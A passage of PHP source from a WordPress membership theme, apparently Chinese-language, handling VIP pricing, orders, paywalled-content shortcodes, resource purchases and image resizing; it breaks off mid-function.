function tt_get_vip_price($vip_type = Member::MONTHLY_VIP)
{
    switch ($vip_type) {
        case Member::MONTHLY_VIP:
            $price = tt_get_option('tt_monthly_vip_price', 10);
            break;
        case Member::ANNUAL_VIP:
            $price = tt_get_option('tt_annual_vip_price', 100);
            break;
        case Member::PERMANENT_VIP:
            $price = tt_get_option('tt_permanent_vip_price', 199);
            break;
        default:
            $price = 0;
    }

    return sprintf('%0.2f', $price);
}

function tt_create_vip_order($user_id, $vip_type = 1)
{
    if (!in_array($vip_type * (-1), array(Product::MONTHLY_VIP, Product::ANNUAL_VIP, Product::PERMANENT_VIP))) {
        $vip_type = Product::PERMANENT_VIP;
    }

    $order_id = tt_generate_order_num();
    $order_time = current_time('mysql');
    $product_id = $vip_type * (-1);
    $currency = 'cash';
    $order_price = tt_get_vip_price($vip_type);
    $order_total_price = $order_price;

    switch ($vip_type * (-1)) {
        case Product::MONTHLY_VIP:
            $product_name = Product::MONTHLY_VIP_NAME;
            break;
        case Product::ANNUAL_VIP:
            $product_name = Product::ANNUAL_VIP_NAME;
            break;
        case Product::PERMANENT_VIP:
            $product_name = Product::PERMANENT_VIP_NAME;
            break;
        default:
            $product_name = '';
    }

    global $wpdb;
    $prefix = $wpdb->prefix;
    $orders_table = $prefix.'tt_orders';
    $insert = $wpdb->insert(
        $orders_table,
        array(
            'parent_id' => 0,
            'order_id' => $order_id,
            'product_id' => $product_id,
            'product_name' => $product_name,
            'order_time' => $order_time,
            'order_price' => $order_price,
            'order_currency' => $currency,
            'order_quantity' => 1,
            'order_total_price' => $order_total_price,
            'user_id' => $user_id,
        ),
        array('%d', '%s', '%d', '%s', '%s', '%f', '%s', '%d', '%f', '%d')
    );
    if ($insert) {
        return array(
            'insert_id' => $wpdb->insert_id,
            'order_id' => $order_id,
            'total_price' => $order_total_price,
        );
    }

    return false;
}

function tt_get_vip_product_name($product_id)
{
    switch ($product_id) {
        case Product::PERMANENT_VIP:
            return Product::PERMANENT_VIP_NAME;
        case Product::ANNUAL_VIP:
            return Product::ANNUAL_VIP_NAME;
        case Product::MONTHLY_VIP:
            return Product::MONTHLY_VIP_NAME;
        default:
            return '';
    }
}

function tt_query_ip_addr($ip)
{
    $url = 'http://freeapi.ipip.net/'.$ip;
    $body = wp_remote_retrieve_body(wp_remote_get($url));
    $arr = json_decode($body);
    if ($arr[1] == $arr[2]) {
        array_splice($arr, 2, 1);
    }

    return implode($arr);
}

function tt_sc_toggle_content($atts, $content = null)
{
    $content = do_shortcode($content);
    extract(shortcode_atts(array('hide' => 'no', 'title' => '', 'color' => ''), $atts));

    return '<div class="'.tt_conditional_class('toggle-wrap', $hide == 'no', 'show').'"><div class="toggle-click-btn" style="color:'.$color.'"><i class="tico tico-angle-right"></i>'.$title.'</div><div class="toggle-content">'.$content.'</div></div>';
}
add_shortcode('toggle', 'tt_sc_toggle_content');

function tt_sc_product($atts, $content = null)
{
    extract(shortcode_atts(array('id' => ''), $atts));
    if (!empty($id)) {
        $vm = EmbedProductVM::getInstance(intval($id));
        $data = $vm->modelData;
        if (!isset($data->product_id)) {
            return $id;
        }
        $templates = new League\Plates\Engine(THEME_TPL.'/plates');
        $rating = $data->product_rating;
        $args = array(
            'thumb' => $data->product_thumb,
            'link' => $data->product_link,
            'name' => $data->product_name,
            'price' => $data->product_price,
            'currency' => $data->product_currency,
            'rating_value' => $rating['value'],
            'rating_count' => $rating['count'],
            'rating_percent' => $rating['percent'],
            'min_price' => $data->product_min_price,
            'discount' => $data->product_discount,
            'price_icon' => $data->price_icon,
            'product_views' => $data->product_views,
            'product_sales' => $data->product_sales,

        );

        return $templates->render('embed-product', $args);
    }

    return '';
}
add_shortcode('product', 'tt_sc_product');

function tt_sc_post($atts, $content = null){
    extract(shortcode_atts(array('id'=>''), $atts));
    if(!empty($id)) {
        $vm = EmbedPostVM::getInstance(intval($id));
        $data = $vm->modelData;
        $templates = new League\Plates\Engine(THEME_TPL . '/plates');
        $args = array(
            'thumb' => $data->thumb,
            'post_link' => $data->post_link,
            'post_title' => $data->post_title,
            'comment_count' => $data->comment_count,
            'category' => $data->category,
            'author' => $data->author,
            'author_url' => $data->author_url,
            'time' => $data->time,
            'datetime' => $data->datetime,
            'description' => $data->description,
            'views' => $data->views,

        );
        return $templates->render('embed-post', $args);
    }
    return '';
}
add_shortcode('post', 'tt_sc_post');

function tt_sc_button($atts, $content = null){
    extract(shortcode_atts(array('class'=>'default','size'=>'default','href'=>'','title'=>''), $atts));
    if(!empty($href)) {
        return '<a class="btnhref" href="' . $href . '" title="' . $title . '" target="_blank"><button type="button" class="btn btn-' . $class .' btn-' . $size . '">' . $content . '</button></a>';
    }else{
        return '<button type="button" class="btn btn-' . $class . ' btn-' . $size . '">' . $content . '</button>';
    }
}
add_shortcode('button', 'tt_sc_button');
function tt_sc_infoblock($atts, $content = null){
    $content = do_shortcode($content);
    extract(shortcode_atts(array('class'=>'info','title'=>''), $atts));
    return '<div class="contextual-callout callout-' . $class . '"><h4>' . $title . '</h4><p>' . $content . '</p></div>';
}
add_shortcode('callout', 'tt_sc_infoblock');

function tt_sc_infobg($atts, $content = null){
    $content = do_shortcode($content);
    extract(shortcode_atts(array('class'=>'info','closebtn'=>'no','bgcolor'=>'','color'=>'','showicon'=>'yes','title'=>''), $atts));
    $close_btn = $closebtn=='yes' ? '<span class="infobg-close"><i class="tico tico-close"></i></span>' : '';
    $div_class = $showicon!='no' ? 'contextual-bg bg-' . $class . ' showicon' : 'bg-' . $class . ' contextual-bg';
    $content = $title ? '<h4>' . $title . '</h4><p>' . $content . '</p>' : '<p>' . $content . '</p>';
    return '<div class="' . $div_class . '">' . $close_btn . $content . '</div>';
}
add_shortcode('infobg', 'tt_sc_infobg');

function tt_sc_l2v( $atts, $content ){
    $content = do_shortcode($content);
    if( !is_null( $content ) && !is_user_logged_in() ) $content = '<div class="bg-lr2v contextual-bg bg-warning"><i class="tico tico-group"></i>' . __(' 此处内容需要 <span class="user-login">登录</span> 才可见', 'tt') . '</div>';
    return $content;
}
add_shortcode( 'ttl2v', 'tt_sc_l2v' );

function tt_sc_r2v( $atts, $content ){
    $content = do_shortcode($content);
    if( !is_null( $content ) ) :
        if(!is_user_logged_in()){
            $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-comment"></i>' . __('此处内容需要登录并 <span class="user-login">发表评论</span> 才可见', 'tt') . '</div>';
        }else{
            global $post;
            $user_id = get_current_user_id();
            if( $user_id != $post->post_author && !user_can($user_id,'edit_others_posts') ){
                $comments = get_comments( array('status' => 'approve', 'user_id' => $user_id, 'post_id' => $post->ID, 'count' => true ) );
                if(!$comments) {
                    $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-comment"></i>' . __('此处内容需要登录并 <span class="tt-lv"><a href="#respond">发表评论</a></span> 才可见' , 'tt'). '</div>';
                }
            }
        }
    endif;
    return $content;
}
add_shortcode( 'ttr2v', 'tt_sc_r2v' );

function tt_sc_sale_content( $atts, $content ){
    $content = do_shortcode($content);
    if( !is_null( $content ) ) :
        if(!is_user_logged_in()){
            $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要 <span class="user-login">登录</span> 并付费购买才可见', 'tt') . '</div>';
        }else{
            global $post;
            $user_id = get_current_user_id();
            if( $user_id != $post->post_author && !user_can($user_id,'edit_others_posts') ){
                 $currency = get_post_meta($post->ID, 'tt_sale_content_currency', true); // 0 - credit 1 - cash
                 $price = get_post_meta($post->ID, 'tt_sale_content_price', true);
                 $currency = $currency == 1 ? '元' : '积分';
                if(!tt_check_bought_post_resources2($post->ID, '0')) {
                    $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要<span class="tt-lv"><a class="buy-content" href="javascript:;" data-post-id="'.$post->ID.'" data-resource-seq="0"><i class="tico tico-cart"></i>'.$price.$currency.'购买</a></span>才可见（购买后可查看此文章所有付费内容）' , 'tt'). '</div>';
                }
            }
        }
    endif;
    return $content;
}
add_shortcode( 'tt_sale_content', 'tt_sc_sale_content' );

function tt_sc_sale_product( $atts, $content ){
    $content = do_shortcode($content);
    extract(shortcode_atts(array('id'=>''), $atts));
    if( !is_null( $content ) && !empty($id) ) :
        $product = get_post($id);
        if(!is_user_logged_in()){
            $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要 <span class="user-login">登录</span> 并购买<a href="'.get_permalink($product).'"><i class="tico tico-cart"></i>此商品</a>才可见', 'tt') . '</div>';
        }else{
            global $post;
            $user_id = get_current_user_id();
            if( $user_id != $post->post_author && !user_can($user_id,'edit_others_posts') ){
                if(!tt_check_user_has_buy_product($id, $user_id)) {
                    $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要购买<a href="'.get_permalink($product).'"><i class="tico tico-cart"></i>此商品</a>才可见' , 'tt'). '</div>';
                }
            }
        }
    endif;
    return $content;
}
add_shortcode( 'tt_sale_product', 'tt_sc_sale_product' );

function tt_sc_vipv( $atts, $content ){
    $content = do_shortcode($content);
    if( !is_null( $content ) ) :
        if(!is_user_logged_in()){
            $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要 <span class="user-login">登录</span> 并开通会员才可见', 'tt') . '</div>';
        }else{
            global $post;
            $user_id = get_current_user_id();
            if( $user_id != $post->post_author && !user_can($user_id,'edit_others_posts') ){
                $member = new Member($user_id);
                if(!$member->is_vip()) {
                    $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要<span class="tt-lv"><a href="/me/membership">开通会员</a></span>才可见' , 'tt'). '</div>';
                }
            }
        }
    endif;
    return $content;
}
add_shortcode( 'ttvipv', 'tt_sc_vipv' );
function tt_sc_vip1v( $atts, $content ){
    $content = do_shortcode($content);
    if( !is_null( $content ) ) :
        if(!is_user_logged_in()){
            $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要 <span class="user-login">登录</span> 并开通月费会员及以上才可见', 'tt') . '</div>';
        }else{
            global $post;
            $user_id = get_current_user_id();
            if( $user_id != $post->post_author && !user_can($user_id,'edit_others_posts') ){
                $member = new Member($user_id);
                if($member->vip_type < 1) {
                    $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要<span class="tt-lv"><a href="/me/membership">开通月费会员</a></span>及以上才可见' , 'tt'). '</div>';
                }
            }
        }
    endif;
    return $content;
}
add_shortcode( 'ttvip1v', 'tt_sc_vip1v' );
function tt_sc_vip2v( $atts, $content ){
    $content = do_shortcode($content);
    if( !is_null( $content ) ) :
        if(!is_user_logged_in()){
            $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要 <span class="user-login">登录</span> 并开通年费会员及以上才可见', 'tt') . '</div>';
        }else{
            global $post;
            $user_id = get_current_user_id();
            if( $user_id != $post->post_author && !user_can($user_id,'edit_others_posts') ){
                $member = new Member($user_id);
                if($member->vip_type < 2) {
                    $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要<span class="tt-lv"><a href="/me/membership">开通年费会员</a></span>及以上才可见' , 'tt'). '</div>';
                }
            }
        }
    endif;
    return $content;
}
add_shortcode( 'ttvip2v', 'tt_sc_vip2v' );
function tt_sc_vip3v( $atts, $content ){
    $content = do_shortcode($content);
    if( !is_null( $content ) ) :
        if(!is_user_logged_in()){
            $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要 <span class="user-login">登录</span> 并开通永久会员才可见', 'tt') . '</div>';
        }else{
            global $post;
            $user_id = get_current_user_id();
            if( $user_id != $post->post_author && !user_can($user_id,'edit_others_posts') ){
                $member = new Member($user_id);
                if($member->vip_type != 3) {
                    $content = '<div class="bg-lr2v contextual-bg bg-info"><i class="tico tico-group"></i>' . __('此处内容需要<span class="tt-lv"><a href="/me/membership">开通永久会员</a></span>才可见' , 'tt'). '</div>';
                }
            }
        }
    endif;
    return $content;
}
add_shortcode( 'ttvip3v', 'tt_sc_vip3v' );

function tt_to_pre_tag($atts, $content)
{
    return '<div class="precode clearfix"><pre class="lang:default decode:true " >'.str_replace('#038;', '', htmlspecialchars($content, ENT_COMPAT, 'UTF-8')).'</pre></div>';
}
add_shortcode('php', 'tt_to_pre_tag');

function tt_check_bought_post_resources($post_id, $resource_seq)
{
    $user_id = get_current_user_id();
    if (!$user_id) {
        return false;
    }

    $user_bought = get_user_meta($user_id, 'tt_bought_posts', true);
    if (empty($user_bought)) {
        return false;
    }
    $user_bought = maybe_unserialize($user_bought);
    if (!isset($user_bought['p_'.$post_id])) {
        return false;
    }

    $post_bought_resources = $user_bought['p_'.$post_id];
    if (isset($post_bought_resources[$resource_seq]) && $post_bought_resources[$resource_seq]) {
        return true;
    }

    return false;
}
function tt_get_user_post_resource_orders($user_id, $post_id)
{
    $user_id = $user_id ?: get_current_user_id();
    if (!$user_id) {
        return null;
    }

    global $wpdb;
    $prefix = $wpdb->prefix;
    $orders_table = $prefix.'tt_orders';
    $sql = sprintf("SELECT * FROM $orders_table WHERE `deleted`=0 AND `user_id`=%d AND `product_id`=%d AND `order_status`=4 ORDER BY `id` DESC", $user_id, $post_id);
    $results = $wpdb->get_results($sql);

    return $results;
}

function tt_bought_post_resource($post_id, $resource_seq, $is_new_type = false) {
    $user = wp_get_current_user();
    $user_id = $user->ID;
    if(!$user_id) {
        return new WP_Error('user_not_signin', __('You must sign in to continue your purchase', 'tt'), array('status' => 401));
    }

    //检查文章资源是否存在
    if($resource_seq != '0') {
    $resource_meta_key = $is_new_type ? 'tt_sale_dl2' : 'tt_sale_dl';
    $post_resources = explode(PHP_EOL, trim(get_post_meta($post_id, $resource_meta_key, true)));
    if(!isset($post_resources[$resource_seq - 1])) {
        return new WP_Error('post_resource_not_exist', __('The resource you willing to buy is not existed', 'tt'), array('status' => 404));
    }
    $the_post_resource = explode('|', $post_resources[$resource_seq - 1]);
    // <!-- 资源名称|资源下载url1_密码1,资源下载url2_密码2|资源价格|币种 -->
    $currency = $is_new_type && isset($the_post_resource[3]) && strtolower(trim($the_post_resource[3]) === 'cash') ? 'cash' : 'credit';
    $price = isset($the_post_resource[2]) ? abs(trim($the_post_resource[2])) : 1;
    $resource_name = $the_post_resource[0];
    if ($is_new_type) {
        $pans = explode(',', $the_post_resource[1]);
        $pan_detail = explode('__', $pans[0]);
        $resource_link = $pan_detail[0];
        $resource_pass = isset($pan_detail[1]) ? trim($pan_detail[1]) : __('None', 'tt');
    } else {
        $resource_link = $the_post_resource[1];
        $resource_pass = isset($the_post_resource[3]) ? trim($the_post_resource[3]) : __('None', 'tt');
    }
    } else {
    $resource_name = '付费显示内容';
    $currency = get_post_meta($post_id, 'tt_sale_content_currency', true); // 0 - credit 1 - cash
    $price = get_post_meta($post_id, 'tt_sale_content_price', true);
    $currency =isset($currency) && $currency == 1 ? 'cash' : 'credit';
     }
    //检查是否已购买
    if($is_new_type ? tt_check_bought_post_resources2($post_id, $resource_seq) : tt_check_bought_post_resources($post_id, $resource_seq)) {
        return new WP_Error('post_resource_bought', __('You have bought the resource yet, do not repeat a purchase', 'tt'), array('status' => 200));
    }

    // 先计算VIP价格优惠
    $member = new Member($user);
    $vip_price = $price;
    $vip_type = $member->vip_type;
    $tt_monthly_vip_down_count = tt_get_option('tt_monthly_vip_down_count');
    $tt_annual_vip_down_count = tt_get_option('tt_annual_vip_down_count');
    $tt_permanent_vip_down_count = tt_get_option('tt_permanent_vip_down_count');
    $vip_down_count = (int) get_user_meta($user_id, 'tt_vip_down_count', true);
    switch ($vip_type) {
        case Member::MONTHLY_VIP:
            $vip_price = absint(tt_get_option('tt_monthly_vip_discount', 100) * $price / 100);
            if($tt_monthly_vip_down_count > 0 && $vip_down_count >= $tt_monthly_vip_down_count){
            $vip_price = $price;
            }
            break;
        case Member::ANNUAL_VIP:
            $vip_price = absint(tt_get_option('tt_annual_vip_discount', 90) * $price / 100);
            if($tt_annual_vip_down_count > 0 && $vip_down_count >= $tt_annual_vip_down_count){
            $vip_price = $price;
            }
            break;
        case Member::PERMANENT_VIP:
            $vip_price = absint(tt_get_option('tt_permanent_vip_discount', 80) * $price / 100);
            if($tt_permanent_vip_down_count > 0 && $vip_down_count >= $tt_permanent_vip_down_count){
            $vip_price = $price;
            }
            break;
    }
    $vip_string = tt_get_member_type_string($vip_type);

    if ($is_new_type) {
        $create = tt_create_resource_order($post_id, $resource_name, $resource_seq, $vip_price, $currency === 'cash');
        if ($create instanceof WP_Error) {
            return $create;
        } elseif (!$create) {
            return new WP_Error('create_order_failed', __('Create order failed', 'tt'), array('status' => 403));
        }
        $checkout_nonce = wp_create_nonce('checkout');
        $checkout_url = add_query_arg(array('oid' => $create['order_id'], 'spm' => $checkout_nonce), tt_url_for('checkout'));
        if ($vip_price - 0 >= 0.01) {
            $create['url'] = $checkout_url;
        } else {
            $create = array_merge($create, array(
                'cost' => 0,
                'text' => sprintf(__('消费: %1$d (%2$s优惠, 原价%3$d)', 'tt'), $vip_price, $vip_string, $price),
                'vip_str' => $vip_string
            ));
        }
        return tt_api_success(__('Create order successfully', 'tt'), array('data' => $create));
    } else {
        //检查用户积分是否足够
        $payment = tt_credit_pay($vip_price, $resource_name, true);
        if($payment instanceof WP_Error) {
            return $payment;
        }

        $user_bought = get_user_meta($user_id, 'tt_bought_posts', true);
        if(empty($user_bought)){
            $user_bought = array(
                'p_' . $post_id => array($resource_seq => true)
            );
        }else{
            $user_bought = maybe_unserialize($user_bought);
            if(!isset($user_bought['p_' . $post_id])) {
                $user_bought['p_' . $post_id] = array($resource_seq => true);
            }else{
                $buy_seqs = $user_bought['p_' . $post_id];
                $buy_seqs[$resource_seq] = true;
                $user_bought['p_' . $post_id] = $buy_seqs;
            }
        }
        $save = maybe_serialize($user_bought);
        $update = update_user_meta($user_id, 'tt_bought_posts', $save); //Meta ID if the key didn't exist; true on successful update; false on failure or if $meta_value is the same as the existing meta value in the database.
        if(!$update){ //TODO 返还扣除的积分
            return new WP_Error('post_resource_bought_failure', __('Failed to buy the resource, or maybe you have bought before', 'tt'), array('status' => 403));
        }

        // 发送邮件
        $subject = __('Payment for the resource finished successfully', 'tt');
        $balance = get_user_meta($user_id, 'tt_credits', true);
        if($resource_seq != '0') {
        $args = array(
            'adminEmail' => get_option('admin_email'),
            'resourceName' => $resource_name,
            'resourceLink' => $resource_link,
            'resourcePass' => $resource_pass,
            'spentCredits' => $price,
            'creditsBalance' => $balance
        );
        }else{
         $args = array(
            'adminEmail' => get_option('admin_email'),
            'resourceName' => '付费查看内容',
            'resourceLink' => '无',
            'resourcePass' => '无',
            'spentCredits' => $price,
            'creditsBalance' => $balance
        );
        }
        tt_async_mail('', $user->user_email, $subject, $args, 'buy-resource');

        if($price - $vip_price > 0) {
            $text = sprintf(__('消费积分: %1$d (%2$s优惠, 原价%3$d)<br>当前积分余额: %2$d', 'tt'), $vip_price, $vip_string, $price, $balance);
            $cost = $vip_price;
        }else{
            $text = sprintf(__('消费积分: %1$d<br>当前积分余额: %2$d', 'tt'), $price, $balance);
            $cost = $price;
        }
        return array(
            'cost' => $cost,
            'text' => $text,
            'vip_str' => $vip_string,
            'balance' => $balance
        );
    }
}

function tt_add_bought_resource_rewards($order_id) {
    $order = tt_get_order($order_id);
    if (!$order || $order->order_status != OrderStatus::TRADE_SUCCESS) {
        return;
    }
    preg_match('/([0-9]+)_([0-9]+)/i', $order_id, $matches);
    if (!$matches || count($matches) < 3) {
        return;
    }
    $resource_seq = $matches[2] * 1;
    $product_id = $order->product_id;
    $author_id = get_post_field('post_author', $product_id);
    $post_resources = explode(PHP_EOL, trim(get_post_meta($product_id, 'tt_sale_dl2', true)));
    if (!isset($post_resources[$resource_seq - 1]) && $resource_seq != 0) {
        return false;
    }
    // <!-- 资源名称|资源下载url1_密码1,资源下载url2_密码2|资源价格|币种 -->
    $currency = $order->order_currency;
    $price = $order->order_total_price * 1;
    $resource_name = $order->product_name;
    $add_ratio = tt_get_option('tt_bought_resource_rewards_ratio', 100) / 100;
    if ($currency == 'cash') {
        $ratio = tt_get_option('tt_hundred_credit_price', 1);
        $price = $price / $ratio * 100 * $add_ratio;
    } else {
        $price = intval($price * $add_ratio);
    }
    return tt_update_user_credit($author_id, $price, sprintf(__('付费资源>>%1$s<<售出奖励%2$d积分', 'tt'), $resource_name, $price), false);
}
add_action('tt_order_status_change', 'tt_add_bought_resource_rewards');

function tt_create_resource_order($product_id, $product_name, $resource_seq, $order_price = 1, $is_cash)
{
    $user_id = get_current_user_id();
    $order_id = tt_generate_order_num().'_'.$resource_seq;
    $order_time = current_time('mysql');
    $currency = $is_cash ? 'cash' : 'credit';
    $order_quantity = 1;
    $order_total_price = $order_price;

    global $wpdb;
    $prefix = $wpdb->prefix;
    $orders_table = $prefix.'tt_orders';
    $insert = $wpdb->insert(
        $orders_table,
        array(
            'parent_id' => 0,
            'order_id' => $order_id,
            'product_id' => $product_id,
            'product_name' => $product_name,
            'order_time' => $order_time,
            'order_price' => $order_price,
            'order_currency' => $currency,
            'order_quantity' => $order_quantity,
            'order_total_price' => $order_total_price,
            'user_id' => $user_id,
            'order_status' => $order_total_price - 0 < 0.01 ? OrderStatus::TRADE_SUCCESS : OrderStatus::WAIT_PAYMENT,
        ),
        array(
            '%d',
            '%s',
            '%d',
            '%s',
            '%s',
            '%f',
            '%s',
            '%d',
            '%f',
            '%d',
            '%d',
        )
    );
    if ($insert) {
        $tt_vip_down_count = get_user_meta($user_id, 'tt_vip_down_count', true);
        update_user_meta($user_id, 'tt_vip_down_count', (int) $tt_vip_down_count + 1);
        // 新创建现金订单时邮件通知管理员
        if ($currency == 'cash') {
            do_action('tt_order_status_change', $order_id);
        }

        return array(
            'insert_id' => $wpdb->insert_id,
            'order_id' => $order_id,
            'total_price' => $order_total_price,
        );
    }

    return false;
}

function tt_check_bought_post_resources2($post_id, $resource_seq)
{
    $user_id = get_current_user_id();
    if (!$user_id) {
        return false;
    }

    $orders = tt_get_user_post_resource_orders($user_id, $post_id);
    if (count($orders) == 0) {
        return false;
    }

    $suffix = '_'.$resource_seq;
    $length = strlen($suffix);
    foreach ($orders as $order) {
        if (substr($order->order_id, -1 * $length) == $suffix) {
            return true;
        }
    }

    return false;
}

function tt_get_post_sale_resources($post_id)
{
    $sale_dls = trim(get_post_meta($post_id, 'tt_sale_dl2', true));
    $sale_dls = !empty($sale_dls) ? explode(PHP_EOL, $sale_dls) : array();
    $resources = array();
    $seq = 0;
    foreach ($sale_dls as $sale_dl) {
        $sale_dl = explode('|', $sale_dl);
        if (count($sale_dl) < 3) {
            continue;
        } else {
            ++$seq;
        }
        $resource = array();
        $resource['seq'] = $seq;
        $resource['name'] = $sale_dl[0];
        $pans = explode(',', $sale_dl[1]);
        $downloads = array();
        foreach ($pans as $pan) {
            $pan_details = explode('__', $pan);
            array_push($downloads, array(
               'url' => $pan_details[0],
                'password' => $pan_details[1],
            ));
        }
        $resource['downloads'] = $downloads;
        $resource['price'] = isset($sale_dl[2]) ? trim($sale_dl[2]) : 1;
        $resource['currency'] = isset($sale_dl[3]) && strtolower(trim($sale_dl[3])) == 'cash' ? 'cash' : 'credit';
        array_push($resources, $resource);
    }

    return $resources;
}

function tt_get_post_download_content($post_id, $seq)
{
    $content = '';
    $resources = tt_get_post_sale_resources($post_id);
    if ($seq == 0 || $seq > count($resources)) {
        return $content;
    }
    $resource = $resources[$seq - 1];
    $downloads = $resource['downloads'];
    foreach ($downloads as $download) {
        $content .= sprintf(__('<li style="margin: 0 0 10px 0;"><p style="padding: 5px 0; margin: 0;">%1$s</p><p style="padding: 5px 0; margin: 0;">下载链接：<a href="%2$s" title="%1$s" target="_blank">%2$s</a>下载密码：%3$s</p></li>', 'tt'), $resource['name'], $download['url'], $download['password']);
    }

    return $content;
}

function tt_unique_img_name($filename, $type)
{//$type -> image/png
    $tmp_name = mt_rand(10, 25).time().$filename;
    $ext = str_replace('image/', '', $type);

    return md5($tmp_name).'.'.$ext;
}

function tt_get_img_info($img)
{
    $imageInfo = getimagesize($img);
    if ($imageInfo !== false) {
        $imageType = strtolower(substr(image_type_to_extension($imageInfo[2]), 1));
        $info = array(
            'width' => $imageInfo[0],
            'height' => $imageInfo[1],
            'type' => $imageType,
            'mime' => $imageInfo['mime'],
        );

        return $info;
    } else {
        return false;
    }
}

function tt_resize_img($ori, $dst = '', $dst_width = 100, $dst_height = 100, $delete_ori = false)
{ //绝对路径, 带文件名

    $original_ratio = $dst_width / $dst_height;
    $info = tt_get_img_info($ori);

    if ($info) {
        if ($info['type'] == 'jpg' || $info['type'] == 'jpeg') {
            $im = imagecreatefromjpeg($ori);
        }
        if ($info['type'] == 'gif') {
            $im = imagecreatefromgif($ori);
        }
        if ($info['type'] == 'png') {
            $im = imagecreatefrompng($ori);
        }
        if ($info['type'] == 'bmp') {
            $im = imagecreatefromwbmp($ori);
        }
        if ($info['width'] / $info['height'] > $original_ratio) {
            $height = intval($info['height']);
            $width = $height * $original_ratio;
            $x = ($info['width'] - $width) / 2;
            $y = 0;
        } else {
            $width = intval($info['width']);
            $height = $width / $original_ratio;
            $x = 0;
            $y = ($info['height'] - $height) / 2;
        }
        $new_img = imagecreatetruecolor($width, $height);
        imagecopy($new_img, $im, 0, 0, $x, $y, $info['width'], $info['height']);
        $scale = $dst_width / $width;
        $target = imagecreatetruecolor($dst_width, $dst_height);
        $final_w = intval($width * $scale);
        $final_h = intval($height * $scale);
        imagecopyresampled($target, $new_img, 0, 0, 0, 0, $final_w, $final_h, $width, $height);
        imagejpeg($target, $dst ?: $ori);
        imagedestroy($im);
        imagedestroy($new_img);
        imagedestroy($target);

        if ($delete_ori) {
            unlink($ori);
        }
    }

    return;
}

function tt_copy_img($ori, $dst = '', $delete_ori = false)
{ //绝对路径, 带文件名

    $info = tt_get_img_info($ori);

    if ($info) {
        if ($info['type'] == 'jpg' || $info['type'] == 'jpeg') {
            $im = imagecreatefromjpeg($ori);
        }
        if ($info['type'] == 'gif') {
            $im = imagecreatefromgif($ori);
        }
        if ($info['type'] == 'png') {
            $im = imagecreatefrompng($ori);
        }
        if ($info['type'] == 'bmp') {
            $im = imagecreatefromwbmp($ori);
        }

        $new_img = imagecreatetruecolor($info['width'], $info['height']);
        imagecopy($new_img, $im, 0, 0, 0, 0, $info['width'], $info['height']);
        $scale = 1;
        $target = imagecreatetruecolor($info['width'], $info['height']);
        $final_w = intval($info['width'] * $scale);
        $final_h = intval($info['height'] * $scale);
        imagecopyresampled($target, $new_img, 0, 0, 0, 0, $final_w, $final_h, $info['width'], $info['height']);
        imagejpeg($target, $dst ?: $ori);
        imagedestroy($im);
        imagedestroy($new_img);
        imagedestroy($target);

        if ($delete_ori) {
            unlink($ori);
        }
    }

    return;
}

function tt_update_user_avatar_by_upload($user_id = 0)
{
    $user_id = $user_id ?: get_current_user_id();
    update_user_meta($user_id, 'tt_avatar_type', 'custom');

    //删除VM缓存
    //tt_clear_cache_key_like('tt_cache_daily_vm_MeSettingsVM_user' . $user_id);
    delete_transient('tt_cache_daily_vm_MeSettingsVM_user'.$user_id);
    //tt_clear_cache_key_like('tt_cache_daily_vm_UCProfileVM_author' . $user_id);
    delete_transient('tt_cache_daily_vm_UCProfileVM_author'.$user_id);
    //删除头像缓存
    //tt_clear_cache_key_like('tt_cache_daily_avatar_' . strval($user_id));
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'small'.Utils::getCurrentDateTimeStr('day')));
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'medium'.Utils::getCurrentDateTimeStr('day')));
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'large'.Utils::getCurrentDateTimeStr('day')));
}

function tt_update_user_cover_by_upload($user_id = 0, $meta)
{
    $user_id = $user_id ?: get_current_user_id();
    update_user_meta($user_id, 'tt_user_cover', $meta);

    //删除VM缓存
    //tt_clear_cache_key_like('tt_cache_daily_vm_MeSettingsVM_user' . $user_id);
    delete_transient('tt_cache_daily_vm_MeSettingsVM_user'.$user_id);
    //tt_clear_cache_key_like('tt_cache_daily_vm_UCProfileVM_author' . $user_id);
    delete_transient('tt_cache_daily_vm_UCProfileVM_author'.$user_id);
}

function tt_update_user_avatar_by_oauth($user_id, $avatar_type = 'qq')
{
    if (!$user_id) {
        return;
    }

    //update_user_meta($user_id, 'tt_avatar_type', $avatar_type); //TODO filter $avatar_type

    //删除VM缓存
    delete_transient('tt_cache_daily_vm_MeSettingsVM_user'.$user_id);
    delete_transient('tt_cache_daily_vm_UCProfileVM_author'.$user_id);
    //删除头像缓存
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'small'.Utils::getCurrentDateTimeStr('day')));
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'medium'.Utils::getCurrentDateTimeStr('day')));
    delete_transient('tt_cache_daily_avatar_'.$user_id.'_'.md5(strval($user_id).'large'.Utils::getCurrentDateTimeStr('day')));
}

function tt_has_connect($type = 'qq', $user_id = 0)
{
    if (!in_array($type, array('qq', 'weibo', 'weixin'))) {
        return  false;
    }
    $user_id = $user_id ?: get_current_user_id();
    switch ($type) {
        case 'qq':
            $instance = new OpenQQ($user_id);

            return $instance->isOpenConnected();
        case 'weibo':
            $instance = new OpenWeibo($user_id);

            return $instance->isOpenConnected();
        case 'weixin':
            $instance = new OpenWeiXin($user_id);

            return $instance->isOpenConnected();
    }

    return false;
}

function tt_exec_api_actions($action)
{
    switch ($action) {
